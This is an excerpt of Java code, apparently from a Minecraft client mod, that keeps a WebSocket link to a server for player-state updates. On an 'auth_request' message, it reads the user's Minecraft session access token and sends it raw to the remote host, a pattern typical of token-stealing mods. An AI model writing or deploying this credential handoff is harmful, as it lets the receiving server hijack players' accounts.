            ...
            while (isRunning) {
                try {
                    ...
                    if (client != null && client.getCurrentServer() != null && client.player != null) {
                        ...
                        if (!serverIp.equals(currentConnectedServer)) {
                            authFailed = false;
                        }
                        ...
                        if ((!serverIp.equals(currentConnectedServer) || webSocket == null) && !authFailed) {
            ...
            webSocket = client.newWebSocketBuilder()
                .buildAsync(URI.create(wsUrl), new WebSocket.Listener() {
                        ...
                        if (last) {
                            ...
                            try {
                                ...
                                if (responseJson.has("type")) {
                                    ...
                                    if (type.equals("auth_request")) {
                                        try {
                                            String accessToken = Minecraft.getInstance().getUser().getAccessToken();
                                            
                                            JsonObject authComplete = new JsonObject();
                                            authComplete.addProperty("action", "auth_complete");
                                            authComplete.addProperty("token", accessToken);
                                            
                                            webSocket.sendText(authComplete.toString(), true);
                                        } catch (Exception e) {
                                            System.err.println("Failed to send auth_complete: " + e.getMessage());
                                        }
                                        
                                    } else if (type.equals("state") && responseJson.has("players")) {
                    ...
                    public CompletionStage<?> onClose(WebSocket webSocket, int statusCode, String reason) {
                        ...
                        if (statusCode == 1008) {
                            System.err.println("Authentication permanently failed. Stopped reconnecting.");
                            authFailed = true;
                        }
                        return null;
                    }
